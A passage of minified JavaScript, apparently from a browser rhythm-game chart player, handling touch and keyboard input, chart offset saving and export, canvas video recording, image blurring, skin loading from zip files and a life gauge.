this.element.addEventListener("touchstart",l,o),this.element.addEventListener("touchmove",d,o),this.element.addEventListener("touchend",u),this.element.addEventListener("touchcancel",f),this.callbacks.push({touchstart:l,touchmove:d,touchend:u,touchcancel:f})}clearTouchEvent(t){const{touchstart:n,touchmove:s,touchend:r,touchcancel:o}=this.callbacks[t-1];this.element.removeEventListener("touchstart",n),this.element.removeEventListener("touchmove",s),this.element.removeEventListener("touchend",r),this.element.removeEventListener("touchcancel",o),this.callbacks[t-1]=null}setKeyboardEvent({keydownCallback:t=function(){},keyupCallback:n=function(){}}){const s=()=>{if(document.activeElement instanceof HTMLTextAreaElement)return!0;if(document.activeElement instanceof HTMLInputElement){const l=document.activeElement.getAttribute("type");return!/^(button|checkbox|image|radio|reset|submit)$/.test(l)}return!1},r=l=>{s()||(l.preventDefault(),t(l))},o=l=>{s()||(l.preventDefault(),n(l))};return self.addEventListener("keydown",r),self.addEventListener("keyup",o),this.callbacks.push({keydown:r,keyup:o})}clearKeyboardEvent(t){const{keydown:n,keyup:s}=this.callbacks[t-1];self.removeEventListener("keydown",n),self.removeEventListener("keyup",s),this.callbacks[t-1]=null}}class InteractProxy{constructor(t){this.interact=new Interact(t),this.mouseEvent=null,this.touchEvent=null,this.keyboardEvent=null,this.mouseEventId=0,this.touchEventId=0,this.keyboardEventId=0}setMouseEvent(t){this.mouseEvent=t}setTouchEvent(t){this.touchEvent=t}setKeyboardEvent(t){this.keyboardEvent=t}activate(){this.mouseEvent&&(this.mouseEventId=this.interact.setMouseEvent(this.mouseEvent)),this.touchEvent&&(this.touchEventId=this.interact.setTouchEvent(this.touchEvent)),this.keyboardEvent&&(this.keyboardEventId=this.interact.setKeyboardEvent(this.keyboardEvent))}deactive(){this.mouseEventId&&this.interact.clearMouseEvent(this.mouseEventId),this.touchEventId&&this.interact.clearTouchEvent(this.touchEventId),this.keyboardEventId&&this.interact.clearKeyboardEvent(this.keyboardEventId)}}async function saveAdjustedChart(e,t){if(t&&!await shared$1.game.msgHandler.confirm("是否保存谱面延迟"))return;const n=JSON.parse(sessionStorage.getItem("loadedChart"));if(n.isFromURL||!n)downloadRPE(e);else{(typeof e.chart.offset!="number"||!hook.chartsMD5.get(hook.selectchart.value))&&shared$1.game.msgHandler.sendMessage("保存已设置延迟失败","error");const s=await ptdb.gameConfig.get("savedChartOffsets",{});s[hook.chartsMD5.get(hook.selectchart.value)]=e.chart.offset,await ptdb.gameConfig.save(s,"savedChartOffsets"),shared$1.game.msgHandler.sendMessage("更改后的谱面延迟已保存","success")}}function downloadRPE(e){let t,n;if(e.chart.chartRPE)e.chart.chartRPE.META.offset=e.chart.offset*1e3,t=JSON.stringify(e.chart.chartRPE),n=`${e.chart.chartRPE.META.id}_adjusted.json`;else if(e.chart.chartPec)t=modifyFirstLine(e.chart.chartPec,(e.chart.offset*1e3+175).toFixed(0)),n=`Chart_${inputName.value}_adjusted.pec`;else return shared$1.game.msgHandler.sendMessage("仅支持导出 RPE 谱面","error");const s=new Blob([t],{type:"application/json"});(window.nativeApi?window.nativeApi.saveAs.bind(window.nativeApi):saveAs)(window.nativeApi?t:s,n),shared$1.game.msgHandler.sendMessage("调整后的谱面文件已下载","success")}function modifyFirstLine(e,t){e=e.replaceAll(`\r
`,`
`);const n=e.split(`
`);return n.length>0&&(n[0]=t),n.join(`
`)}const valert=e=>console.error(e);let ready=!1,manual=!1,recording=!1;const video={container:null,createUI(){this.container||(this.container=document.createElement("div"),this.container.textContent="VR",Object.assign(this.container.style,{background:"rgb(139, 195, 74)",color:"rgb(240, 241, 254)",borderRadius:"2vmin",padding:"1vmin",zIndex:"150",position:"absolute",fontFamily:'"Saira"',fontSize:"4vmin",opacity:"0.8",lineHeight:"initial",left:"100px",top:"100px"}),this.container.addEventListener("mousedown",e=>{e.preventDefault();let t=!1;const n=getMoveFn(this.container,e,()=>t=!0);window.addEventListener("mousemove",n),window.addEventListener("mouseup",()=>{window.removeEventListener("mousemove",n),t||record()},{once:!0})}),this.container.addEventListener("touchstart",e=>{e.preventDefault();let t=!1;const n=getMoveFn(this.container,e,()=>t=!0);window.addEventListener("touchmove",n,{passive:!1}),window.addEventListener("touchend",()=>{window.removeEventListener("touchmove",n),t||record()},{once:!0})}),hook.app.stage.appendChild(this.container))},destroyUI(){this.container&&(this.container.remove(),this.container=null)},record(){const{audio:{actx:e},app:{canvas:t}}=hook;if(!e.createMediaStreamDestination){valert("Recording Failed: Your browser does not support MediaStreamDestination");return}if(!t.captureStream){valert("Recording Failed: Your browser does not support HTMLCanvasElement.captureStream");return}if(this.msdest||(this.msdest=e.createMediaStreamDestination()),!this.msdest)return;hook.audio.dest=this.msdest;const n=["video/mp4;codecs=avc1","video/mp4;codecs=mp4a","video/webm;codecs=vp9,pcm","video/webm;codecs=vp8,pcm","video/webm;codecs=vp9,opus","video/webm;codecs=vp8,opus"].find(l=>MediaRecorder.isTypeSupported(l)),s=t.captureStream(),r=this.msdest.stream;console.log(r.getAudioTracks()[0]);const o=new MediaStream([s.getVideoTracks()[0],r.getAudioTracks()[0]]);try{const l=new MediaRecorder(o,{videoBitsPerSecond:2e7,mimeType:n||""}),d=[];l.ondataavailable=u=>u.data&&u.data.size&&d.push(u.data),l.onstop=()=>{if(s.getTracks().forEach(u=>u.stop()),d.length){const u=new Blob(d),f=document.createElement("a");f.href=URL.createObjectURL(u),f.download=`${parseInt(Date.now()/1e3)}.${n.match(/\/(.+)?;/)[1]}`,f.click(),d.length=0}else valert("Recording Failed")},l.start(),recording=!0,this.stop=()=>{l.stop(),recording=!1}}catch(l){valert(`Recording Failed: ${l.message}`)}},stop(){}};function record(){ready?recording?(video.container.style.background="rgb(139, 195, 74)",video.stop()):(video.container.style.background="rgb(195, 75, 79)",video.record()):(manual=!manual,manual?video.container.textContent="SR":video.container.textContent="VR")}function getMoveFn(e,t,n){const s=t.changedTouches?t.changedTouches[0]:t,r=s.pageX,o=s.pageY,l=e.offsetLeft,d=e.offsetTop,u=e.offsetWidth/2,f=e.offsetHeight/2,m=e.parentElement;return function(g){const y=g.changedTouches?g.changedTouches[0]:g,v=l+y.pageX-r+u,x=d+y.pageY-o+f,E=u/m.offsetWidth*100,S=f/m.offsetHeight*100,w=v/m.offsetWidth*100,k=x/m.offsetHeight*100;e.style.left=w>50?"auto":`${Math.max(0,w-E)}%`,e.style.right=w>50?`${100-Math.min(100,w+E)}%`:"auto",e.style.top=k>50?"auto":`${Math.max(0,k-S)}%`,e.style.bottom=k>50?`${100-Math.min(100,k+S)}%`:"auto",n()}}const videoRecorder={_enabled:!1,enable:()=>{videoRecorder._enabled||(video.createUI(),hook.before.set("video",()=>{ready=!0,manual||record()}),hook.end.set("video",()=>{recording&&record(),ready=!1}),videoRecorder._enabled=!0)},disable:()=>{videoRecorder._enabled&&(video.destroyUI(),hook.before.delete("video"),hook.end.delete("video"),videoRecorder._enabled=!1)}};function _typeof(e){"@babel/helpers - typeof";return typeof Symbol=="function"&&typeof Symbol.iterator=="symbol"?_typeof=function(t){return typeof t}:_typeof=function(t){return t&&typeof Symbol=="function"&&t.constructor===Symbol&&t!==Symbol.prototype?"symbol":typeof t},_typeof(e)}function _classCallCheck(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}var mulTable=[512,512,456,512,328,456,335,512,405,328,271,456,388,335,292,512,454,405,364,328,298,271,496,456,420,388,360,335,312,292,273,512,482,454,428,405,383,364,345,328,312,298,284,271,259,496,475,456,437,420,404,388,374,360,347,335,323,312,302,292,282,273,265,512,497,482,468,454,441,428,417,405,394,383,373,364,354,345,337,328,320,312,305,298,291,284,278,271,265,259,507,496,485,475,465,456,446,437,428,420,412,404,396,388,381,374,367,360,354,347,341,335,329,323,318,312,307,302,297,292,287,282,278,273,269,265,261,512,505,497,489,482,475,468,461,454,447,441,435,428,422,417,411,405,399,394,389,383,378,373,368,364,359,354,350,345,341,337,332,328,324,320,316,312,309,305,301,298,294,291,287,284,281,278,274,271,268,265,262,259,257,507,501,496,491,485,480,475,470,465,460,456,451,446,442,437,433,428,424,420,416,412,408,404,400,396,392,388,385,381,377,374,370,367,363,360,357,354,350,347,344,341,338,335,332,329,326,323,320,318,315,312,310,307,304,302,299,297,294,292,289,287,285,282,280,278,275,273,271,269,267,265,263,261,259],shgTable=[9,11,12,13,13,14,14,15,15,15,15,16,16,16,16,17,17,17,17,17,17,17,18,18,18,18,18,18,18,18,18,19,19,19,19,19,19,19,19,19,19,19,19,19,19,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,21,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,22,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,23,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24];function getImageDataFromCanvas(e,t,n,s,r){if(typeof e=="string"&&(e=document.getElementById(e)),!e||_typeof(e)!=="object"||!("getContext"in e))throw new TypeError("Expecting canvas with `getContext` method in processCanvasRGB(A) calls!");var o=e.getContext("2d");try{return o.getImageData(t,n,s,r)}catch(l){throw new Error("unable to access image data: "+l)}}function processCanvasRGBA(e,t,n,s,r,o){if(!(isNaN(o)||o<1)){o|=0;var l=getImageDataFromCanvas(e,t,n,s,r);l=processImageDataRGBA(l,t,n,s,r,o),e.getContext("2d").putImageData(l,t,n)}}function processImageDataRGBA(e,t,n,s,r,o){for(var l=e.data,d=2*o+1,u=s-1,f=r-1,m=o+1,g=m*(m+1)/2,y=new BlurStack,v=y,x,E=1;E<d;E++)v=v.next=new BlurStack,E===m&&(x=v);v.next=y;for(var S=null,w=null,k=0,C=0,R=mulTable[o],L=shgTable[o],O=0;O<r;O++){v=y;for(var I=l[C],A=l[C+1],j=l[C+2],G=l[C+3],X=0;X<m;X++)v.r=I,v.g=A,v.b=j,v.a=G,v=v.next;for(var q=0,J=0,K=0,le=0,se=m*I,de=m*A,oe=m*j,ge=m*G,ke=g*I,ye=g*A,he=g*j,Ce=g*G,we=1;we<m;we++){var $e=C+((u<we?u:we)<<2),me=l[$e],W=l[$e+1],Q=l[$e+2],Z=l[$e+3],ne=m-we;ke+=(v.r=me)*ne,ye+=(v.g=W)*ne,he+=(v.b=Q)*ne,Ce+=(v.a=Z)*ne,q+=me,J+=W,K+=Q,le+=Z,v=v.next}S=y,w=x;for(var fe=0;fe<s;fe++){var M=Ce*R>>L;if(l[C+3]=M,M!==0){var T=255/M;l[C]=(ke*R>>L)*T,l[C+1]=(ye*R>>L)*T,l[C+2]=(he*R>>L)*T}else l[C]=l[C+1]=l[C+2]=0;ke-=se,ye-=de,he-=oe,Ce-=ge,se-=S.r,de-=S.g,oe-=S.b,ge-=S.a;var _=fe+o+1;_=k+(_<u?_:u)<<2,q+=S.r=l[_],J+=S.g=l[_+1],K+=S.b=l[_+2],le+=S.a=l[_+3],ke+=q,ye+=J,he+=K,Ce+=le,S=S.next;var N=w,P=N.r,D=N.g,V=N.b,U=N.a;se+=P,de+=D,oe+=V,ge+=U,q-=P,J-=D,K-=V,le-=U,w=w.next,C+=4}k+=s}for(var z=0;z<s;z++){C=z<<2;var H=l[C],Y=l[C+1],B=l[C+2],F=l[C+3],ee=m*H,te=m*Y,re=m*B,ae=m*F,ie=g*H,ce=g*Y,ve=g*B,Ee=g*F;v=y;for(var be=0;be<m;be++)v.r=H,v.g=Y,v.b=B,v.a=F,v=v.next;for(var Se=s,pe=0,_e=0,ue=0,Re=0,Ie=1;Ie<=o;Ie++){C=Se+z<<2;var Pe=m-Ie;ie+=(v.r=H=l[C])*Pe,ce+=(v.g=Y=l[C+1])*Pe,ve+=(v.b=B=l[C+2])*Pe,Ee+=(v.a=F=l[C+3])*Pe,Re+=H,pe+=Y,_e+=B,ue+=F,v=v.next,Ie<f&&(Se+=s)}C=z,S=y,w=x;for(var Le=0;Le<r;Le++){var xe=C<<2;l[xe+3]=F=Ee*R>>L,F>0?(F=255/F,l[xe]=(ie*R>>L)*F,l[xe+1]=(ce*R>>L)*F,l[xe+2]=(ve*R>>L)*F):l[xe]=l[xe+1]=l[xe+2]=0,ie-=ee,ce-=te,ve-=re,Ee-=ae,ee-=S.r,te-=S.g,re-=S.b,ae-=S.a,xe=z+((xe=Le+m)<f?xe:f)*s<<2,ie+=Re+=S.r=l[xe],ce+=pe+=S.g=l[xe+1],ve+=_e+=S.b=l[xe+2],Ee+=ue+=S.a=l[xe+3],S=S.next,ee+=H=w.r,te+=Y=w.g,re+=B=w.b,ae+=F=w.a,Re-=H,pe-=Y,_e-=B,ue-=F,w=w.next,C+=s}}return e}var BlurStack=function e(){_classCallCheck(this,e),this.r=0,this.g=0,this.b=0,this.a=0,this.next=null};const createCanvas=(e,t)=>{const n=document.createElement("canvas");return Object.assign(n,{width:e,height:t})};function imgBlur(e){const t=createCanvas(e.width*.9,e.height*.9);t.style.cssText+=";overflow:hidden;";const n=t.getContext("2d");if(typeof n.filter=="string")n.filter="blur(60px)",n.drawImage(e,-e.width*.05,-e.height*.05);else{const s=t.width,r=t.height;n.drawImage(e,-e.width*.05,-e.height*.05),processCanvasRGBA(t,0,0,s,r,Math.ceil(Math.min(s,r)*.1))}return createImageBitmap(t)}function imgShader(e,t,n=!1,s=512){const r=hex2rgba(t),o=createCanvas(e.width,e.height),l=o.getContext("2d",{willReadFrequently:!0});l.drawImage(e,0,0);for(let d=0;d<e.height;d+=s)for(let u=0;u<e.width;u+=s){const f=l.getImageData(u,d,s,s);for(let m=0;m<f.data.length/4;m++)f.data[m*4]*=r[0]/255,f.data[m*4+1]*=r[1]/255,f.data[m*4+2]*=r[2]/255,f.data[m*4+3]*=r[3]/255;l.putImageData(f,u,d)}return n?o:createImageBitmap(o)}function imgPainter(e,t,n=512){const s=hex2rgba(t),r=createCanvas(e.width,e.height),o=r.getContext("2d",{willReadFrequently:!0});o.drawImage(e,0,0);for(let l=0;l<e.height;l+=n)for(let d=0;d<e.width;d+=n){const u=o.getImageData(d,l,n,n);for(let f=0;f<u.data.length/4;f++)u.data[f*4]=s[0],u.data[f*4+1]=s[1],u.data[f*4+2]=s[2],u.data[f*4+3]*=s[3]/255;o.putImageData(u,d,l)}return createImageBitmap(r)}function imgSplit(e,t,n){t=Math.floor(t)||Math.min(e.width,e.height),n=Math.floor(n)||t;const s=[];for(let r=0;r<e.height;r+=n)for(let o=0;o<e.width;o+=t)s.push(createImageBitmap(e,o,r,t,n));return Promise.all(s)}function hex2rgba(e){const t=createCanvas(1,1).getContext("2d");return t.fillStyle=e,t.fillRect(0,0,1,1),t.getImageData(0,0,1,1).data}function loadSkinFromBuffer(e,t=!1,n){return new Promise((s,r)=>{try{let g=function(v="",x=/\r?\n/){const E=S=>{try{return JSON.parse(S)}catch{return S}};return v.split(x).reduce((S,w)=>{const[k,C]=w.split(/:(.+)/).map(R=>R.trim());return k&&(S[k]=E(C)),S[k]==="True"&&(S[k]=!0),S[k]==="False"&&(S[k]=!1),S},{})};var o=g;const l="skin",d=[],u=new hook.ZipReader({handler:async v=>d.push(v)});u.addEventListener("loadstart",()=>{}),u.addEventListener("read",v=>hook.handleFile(l,u.total,null,f)),u.read({name:"skin.zip",buffer:e,path:"skin.zip"});async function f(){const v=Object.create(await m(d)),x={Tap:["Tap.png","click.png"],TapHL:["TapHL.png","click_mh.png"],Drag:["Drag.png","drag.png"],DragHL:["DragHL.png","drag_mh.png"],Hold:["Hold.png","hold.png"],HoldHL:["HoldHL.png","hold_mh.png"],Flick:["Flick.png","flick.png"],FlickHL:["FlickHL.png","flick_mh.png"],HitFX:["HitFX.png","hit_fx.png"],HitSong0:["click.ogg"],HitSong1:["drag.ogg"],HitSong2:["flick.ogg"]},E=new Map;for(const[S,w]of Object.entries(x)){const k=d.find(C=>w.find(R=>String(C.name).endsWith(R)));k&&E.set(S,k)}if(E.has("Tap")){const S=await createImageBitmap(new Blob([E.get("Tap").buffer])),w=1089/S.width;hook.noteRender.update("Tap",S,w),E.has("TapHL")?hook.noteRender.update("TapHL",await createImageBitmap(new Blob([E.get("TapHL").buffer])),w):hook.noteRender.update("TapHL",S,w)}if(E.has("Drag")){const S=await createImageBitmap(new Blob([E.get("Drag").buffer])),w=1089/S.width;hook.noteRender.update("Drag",S,w),E.has("DragHL")?hook.noteRender.update("DragHL",await createImageBitmap(new Blob([E.get("DragHL").buffer])),w):hook.noteRender.update("DragHL",S,w)}if(E.has("Hold")){const S=await createImageBitmap(new Blob([E.get("Hold").buffer])),w=1089/S.width,[k,C]=v.holdAtlas,R=v.holdCompact;if(hook.noteRender.update("HoldEnd",await createImageBitmap(S,0,0,S.width,k),w,R),hook.noteRender.update("Hold",await createImageBitmap(S,0,k,S.width,S.height-k-C),w,R),hook.noteRender.update("HoldHead",await createImageBitmap(S,0,S.height-C,S.width,C),w,R),E.has("HoldHL")){const L=await createImageBitmap(new Blob([E.get("HoldHL").buffer])),[O,I]=v.holdAtlasHL||v.holdAtlasMH||v.holdAtlas;hook.noteRender.update("HoldEndHL",await createImageBitmap(L,0,0,L.width,O),w,R),hook.noteRender.update("HoldHL",await createImageBitmap(L,0,O,L.width,L.height-O-I),w,R),hook.noteRender.update("HoldHeadHL",await createImageBitmap(L,0,L.height-I,L.width,I),w,R)}else hook.noteRender.update("HoldEndHL",await createImageBitmap(S,0,0,S.width,k),w,R),hook.noteRender.update("HoldHL",await createImageBitmap(S,0,k,S.width,S.height-k-C),w,R),hook.noteRender.update("HoldHeadHL",await createImageBitmap(S,0,S.height-C,S.width,C),w,R)}if(E.has("Flick")){const S=await createImageBitmap(new Blob([E.get("Flick").buffer])),w=1089/S.width;hook.noteRender.update("Flick",S,w),E.has("FlickHL")?hook.noteRender.update("FlickHL",await createImageBitmap(new Blob([E.get("FlickHL").buffer])),w):hook.noteRender.update("FlickHL",S,w)}if(E.has("HitFX")){const S=await createImageBitmap(new Blob([E.get("HitFX").buffer])),[w,k]=v.hitFx,C=(v.hitFxScale||1)/(S.width/w/256),R=v.hideParticles||!1,L=v.hitFxDuration*1e3||500;hook.noteRender.updateFX(S,C,S.width/w,S.height/k,R,L)}E.has("HitSong0")&&(hook.res.HitSong0=await audio.decode(E.get("HitSong0").buffer.slice(0))),E.has("HitSong1")&&(hook.res.HitSong1=await audio.decode(E.get("HitSong1").buffer.slice(0))),E.has("HitSong2")&&(hook.res.HitSong2=await audio.decode(E.get("HitSong2").buffer.slice(0))),typeof v.colorPerfect=="string"&&v.colorPerfect.startsWith("0x")&&(v.colorPerfect=`#${v.colorPerfect.slice(2)}`),typeof v.colorGood=="string"&&v.colorGood.startsWith("0x")&&(v.colorGood=`#${v.colorGood.slice(2)}`),hook.res.JudgeLineMP=await imgShader(hook.res.JudgeLine,v.colorPerfect||"#feffa9"),hook.res.JudgeLineFC=await imgShader(hook.res.JudgeLine,v.colorGood||"#a2eeff"),hook.tmps.hitPerfectColor=v.hitFxTinted&&hex2rgba(v.colorPerfect)||null,hook.tmps.hitGoodColor=v.hitFxTinted&&hex2rgba(v.colorGood)||null,hook.tmps.hitFxRotate=v.hitFxRotate,hook.customResourceMeta.author=v.author||"unknown",hook.customResourceMeta.name=v.name||"unknown",hook.customResourceMeta.loaded=!0,shared.game.loadHandler.r("loadChart"),console.log(v,v.author,v.name),s(n?await n(E,{author:v.author,name:v.name},v):null)}async function m(v=[]){const x=v.find(S=>String(S.name).endsWith("config.txt"));if(x)return g(await y(x.buffer),/;?\r?\n/);const E=v.find(S=>String(S.name).endsWith("info.yml"));return E?g(await y(E.buffer)):(r(),{})}async function y(v){const x=["utf-8","gbk","big5","shift_jis"];for(const E of x){const S=new TextDecoder(E,{fatal:!0});try{return S.decode(v)}catch(w){if(E===x[x.length-1])throw w}}}}catch{r()}})}async function loadSkinFromDB(e){const t=await ptdb.skin.get(e);if(t.files.has("Tap")){const n=await t.files.get("Tap").file,s=1089/n.width;hook.noteRender.update("Tap",n,s),t.files.has("TapHL")?hook.noteRender.update("TapHL",await t.files.get("TapHL").file,s):hook.noteRender.update("TapHL",n,s)}if(t.files.has("Drag")){const n=await t.files.get("Drag").file,s=1089/n.width;hook.noteRender.update("Drag",n,s),t.files.has("DragHL")?hook.noteRender.update("DragHL",await t.files.get("DragHL").file,s):hook.noteRender.update("DragHL",n,s)}if(t.files.has("Hold")){const n=await t.files.get("Hold").file,s=1089/n.width,[r,o]=t.config.holdAtlas,l=t.config.holdCompact;if(hook.noteRender.update("HoldEnd",await createImageBitmap(n,0,0,n.width,r),s,l),hook.noteRender.update("Hold",await createImageBitmap(n,0,r,n.width,n.height-r-o),s,l),hook.noteRender.update("HoldHead",await createImageBitmap(n,0,n.height-o,n.width,o),s,l),t.files.has("HoldHL")){const d=await t.files.get("HoldHL").file,[u,f]=t.config.holdAtlasHL||t.config.holdAtlasMH||t.config.holdAtlas;hook.noteRender.update("HoldEndHL",await createImageBitmap(d,0,0,d.width,u),s,l),hook.noteRender.update("HoldHL",await createImageBitmap(d,0,u,d.width,d.height-u-f),s,l),hook.noteRender.update("HoldHeadHL",await createImageBitmap(d,0,d.height-f,d.width,f),s,l)}else hook.noteRender.update("HoldEndHL",await createImageBitmap(n,0,0,n.width,r),s,l),hook.noteRender.update("HoldHL",await createImageBitmap(n,0,r,n.width,n.height-r-o),s,l),hook.noteRender.update("HoldHeadHL",await createImageBitmap(n,0,n.height-o,n.width,o),s,l)}if(t.files.has("Flick")){const n=await t.files.get("Flick").file,s=1089/n.width;hook.noteRender.update("Flick",n,s),t.files.has("FlickHL")?hook.noteRender.update("FlickHL",await t.files.get("FlickHL").file,s):hook.noteRender.update("FlickHL",n,s)}if(t.files.has("HitFX")){const n=await t.files.get("HitFX").file,[s,r]=t.config.hitFx,o=(t.config.hitFxScale||1)/(n.width/s/256),l=t.config.hideParticles||!1,d=t.config.hitFxDuration*1e3||500;hook.noteRender.updateFX(n,o,n.width/s,n.height/r,l,d)}t.files.has("HitSong0")&&(hook.res.HitSong0=await audio.decode(t.files.get("HitSong0").file)),t.files.has("HitSong1")&&(hook.res.HitSong1=await audio.decode(t.files.get("HitSong1").file)),t.files.has("HitSong2")&&(hook.res.HitSong2=await audio.decode(t.files.get("HitSong2").file)),typeof t.config.colorPerfect=="string"&&t.config.colorPerfect.startsWith("0x")&&(t.config.colorPerfect=`#${t.config.colorPerfect.slice(2)}`),typeof t.config.colorGood=="string"&&t.config.colorGood.startsWith("0x")&&(t.config.colorGood=`#${t.config.colorGood.slice(2)}`),hook.res.JudgeLineMP=await imgShader(hook.res.JudgeLine,t.config.colorPerfect||"#feffa9"),hook.res.JudgeLineFC=await imgShader(hook.res.JudgeLine,t.config.colorGood||"#a2eeff"),hook.tmps.hitPerfectColor=t.config.hitFxTinted&&hex2rgba(t.config.colorPerfect)||null,hook.tmps.hitGoodColor=t.config.hitFxTinted&&hex2rgba(t.config.colorGood)||null,hook.tmps.hitFxRotate=t.config.hitFxRotate,hook.customResourceMeta.author=t.config.author||"unknown",hook.customResourceMeta.name=t.config.name||"unknown",hook.customResourceMeta.loaded=!0,shared.game.loadHandler.r("loadChart"),shared.game.msgHandler.sendMessage(shared.game.i18n.t("simphi.prprCustomRes.applied"),"success"),resolve(),hook.customResourceMeta.author=t.author||"unknown",hook.customResourceMeta.name=t.name||"unknown",hook.customResourceMeta.loaded=!0}const $id=e=>document.getElementById(e),$$=e=>document.body.querySelectorAll(e),tween={easeInSine:e=>1-Math.cos(e*Math.PI/2),easeOutSine:e=>Math.sin(e*Math.PI/2),easeOutCubic:e=>1+(e-1)**3,easeIOCubic:e=>((e*=2)<1?e**3:(e-2)**3+2)/2,easeInCubic:e=>e**3,ease10:e=>1-(e-1)**4,ease15:e=>e**5},main={};main.modify=e=>e;main.pressTime=0;main.before=new Map;main.now=new Map;main.after=new Map;main.end=new Map;main.filter=null;main.filterOptions={};main["flag{qwq}"]=e=>{};document.oncontextmenu=e=>e.preventDefault();const msgHandler={nodeView:$id("view-msg"),lastMessage:"",msgbox(e,t,n){const s=document.createElement("div");s.innerHTML=e,s.setAttribute("type",t),s.classList.add("msgbox");const r=document.createElement("a");r.innerText="忽略",r.style.float="right",r.onclick=()=>{s.remove(),this.sendMessage(this.lastMessage)},n&&r.classList.add("disabled"),s.appendChild(r),this.nodeView.appendChild(s)},sendMessage(e,t){e&&(this.nodeView.querySelectorAll(".msgbox[type=warn]").length,t==="error"?Notiflix.Notify.failure(e,{ID:"msgHandlerErr",zindex:114515,cssAnimationStyle:"fade",opacity:"0.8",borderRadius:"15px"}):Notiflix.Notify.info(e,{ID:"msgHandlerInfo",showOnlyTheLastOne:!0,zindex:114515,cssAnimationStyle:"fade",clickToClose:!0,opacity:"0.8",borderRadius:"15px"}))},sendWarning(e,t){const n=t?e:Utils.escapeHTML(e);this.msgbox(n,"warn")},sendError(e,t,n){if(t){const s=/([A-Za-z][A-Za-z+-.]{2,}:\/\/|www\.)[^\s\x00-\x20\x7f-\x9f"]{2,}[^\s\x00-\x20\x7f-\x9f"!'),.:;?\]}]/g,r=t.replace(s,(o="")=>{const l=o.startsWith("www.")?`//${o}`:o,d=o.replace(`${location.origin}/`,"");return o.indexOf(location.origin)>-1?`<a href="#"style="color:#023b8f;text-decoration:underline;">${d}</a>`:`<a href="${l}"target="_blank"style="color:#023b8f;text-decoration:underline;">${d}</a>`});this.msgbox(r,"error",n)}return this.sendMessage(e,"error"),!1}};shared$1.game.spMsgHandler=msgHandler;const stat=new simphi.Stat,app=new simphi.Renderer($id("stage"));shared$1.game.simphi=app;const{canvas,ctx,canvasos,ctxos}=app;class Emitter extends EventTarget{constructor(t){super(),this.status=t}emit(t){this.status!==t&&(this.status=t,this.dispatchEvent(new Event("change")))}eq(t){return this.status===t}ne(t){return this.status!==t}}const emitter=new Emitter("stop");shared$1.game.simphi.emitter=emitter;const status2={text:"",list:[],reg(e,t,n){this.list[this.list.length]={toString:()=>n(e)},e.addEventListener(t,this.update.bind(this))},update(){const e=this.list.map(String).filter(Boolean);this.text=e.length===0?"":`(${e.join("+")})`}};let levelText="SP Lv.?";const bgs=new Map,bgsBlur=new Map,bgms=new Map,charts=new Map,chartsMD5=new Map,oriBuffers=new Map,chartLineData=[],chartInfoData=[];function clearStat(){for(;selectbg.options.length;)selectbg.options.remove(0);for(;selectchart.options.length;)selectchart.options.remove(0);for(;selectbgm.options.length;)selectbgm.options.remove(0);bgs.clear(),bgsBlur.clear(),bgms.clear(),oriBuffers.clear(),charts.clear(),chartsMD5.clear(),chartLineData.length=0,chartInfoData.length=0}const gauge={value:100,dead:!1,_flags:[null,0,0,0,0,0,0,0],reset(){gauge.value=100,gauge.dead=!1},init(){gauge.reset(),gauge._flags[0]=app.chart;for(let e=1;e<8;e++)gauge._flags[e]=stat.noteRank[e]},calc(e){if(gauge._flags[0]!==app.chart&&gauge.init(),gauge.dead){for(const n of app.notes)n.scored||(n.status=2,stat.addCombo(2,n.type),n.scored=!0);timeBgm=curTime=app.bgMusic.duration;return}const{noteRank:t}=stat;gauge.value-=(t[6]-gauge._flags[6])*2.5,gauge.value+=(t[7]-gauge._flags[7])*.025,gauge.value+=(t[5]-gauge._flags[5])*.1,gauge.value+=(t[4]-gauge._flags[4])*.2,gauge.value+=(t[1]-gauge._flags[1])*.1,gauge.value+=(t[3]-gauge._flags[3])*.025,gauge.value-=(t[2]-gauge._flags[2])*5,gauge.value=Math.min(gauge.value,100),gauge.value<=0&&shared$1.game.ptmain.gameConfig.stopWhenNoLife&&(gauge.dead=!0);for(let n=1;n<8;n++)gauge._flags[n]=stat.noteRank[n]},draw(){const e=Math.max(gauge.value/100,0);gauge._drawGaugeBar("#3f3b71",1),ctxos.fillStyle="#fff",ctxos.font=`${app.lineScale*.5}px Saira`,ctxos.textAlign="left",ctxos.globalAlpha=tmps.statStatus.pause.alpha,ctxos.fillText("LIFE",app.lineScale*1.75+tmps.statStatus.pause.offsetX,app.lineScale*.95+tmps.statStatus.pause.offsetY),ctxos.textAlign="right",ctxos.fillText(shared$1.game.ptmain.playConfig.mode==="preview"?"∞":e.toFixed(3)*1e3,app.lineScale*6+tmps.statStatus.pause.offsetX,app.lineScale*.95+tmps.statStatus.pause.offsetY),gauge._drawGaugeBar(e<=.25?"#f00":"#0ff",e)},_drawGaugeBar(e,t){ctxos.fillStyle=e,drawRoundRect(ctxos,app.lineScale*1.75+tmps.statStatus.pause.offsetX,app.lineScale*1.1+tmps.statStatus.pause.offsetY,app.lineScale*4.25*Math.max(t,0),app.lineScale*.4,app.lineScale*.1).fill()}};main.now.set("gauge",gauge.calc);async function checkSupport(){const e=async(r,o,l)=>{if(!l())return!0;const d=shared$1.game.i18n.t("simphi.loadLib.err.msg1",{name:r}),u=shared$1.game.i18n.t("simphi.loadLib.err.msg2",{name:r}),f=shared$1.game.i18n.t("simphi.loadLib.err.msg3",{name:r});return await loadJS(o).catch(m=>msgHandler.sendError(d,m.message.replace(/.+/,u),!0))?l()?msgHandler.sendError(d,f,!0):!0:!1};if(await Utils.addFont("Cairo",{alt:"Custom"}),(navigator.standalone!==void 0||navigator.platform.indexOf("Linux")>-1&&navigator.maxTouchPoints===5)&&($id("uploader-select").style.display="none"),navigator.userAgent.indexOf("MiuiBrowser")>-1){const 